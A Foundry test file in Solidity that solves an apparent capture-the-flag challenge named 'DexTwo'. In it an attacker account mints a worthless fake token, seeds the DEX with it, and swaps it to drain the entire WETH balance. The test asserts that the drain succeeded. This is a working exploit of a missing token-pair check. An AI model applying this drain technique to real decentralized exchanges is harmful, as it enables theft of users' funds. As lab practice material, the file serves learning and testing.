// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo dexTwo;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    SwappableTokenTwo fakeToken;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.startPrank(owner);
        dexTwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dexTwo), "wrapped ether", "WETH", 100);
        token2 = new SwappableTokenTwo(address(dexTwo), "dai", "DAI", 100); 
        dexTwo.setTokens(address(token1), address(token2));
        vm.stopPrank();

        vm.startPrank(attacker);
        fakeToken = new SwappableTokenTwo(address(dexTwo), "fakeToken", "FAT", 10);
        fakeToken.transfer(address(dexTwo), 10);
        vm.stopPrank();
    }
    function test_Challenge23_Passed() public {
        vm.startPrank(owner);
        token1.approve(address(dexTwo), type(uint128).max);
        token2.approve(address(dexTwo), type(uint128).max);
        dexTwo.add_liquidity(address(token1), 100);
        dexTwo.add_liquidity(address(token2), 100); 
        vm.stopPrank();

        deal(address(fakeToken), attacker, 10);
        console.log(fakeToken.balanceOf(attacker));

        vm.startPrank(attacker);
        fakeToken.approve(attacker, address(dexTwo), type(uint128).max);
        dexTwo.swap(address(fakeToken), address(token1), 10);
        vm.stopPrank();

        assert(token1.balanceOf(address(dexTwo)) == 0);     
        assertEq(token1.balanceOf(attacker), 100);    
    }
}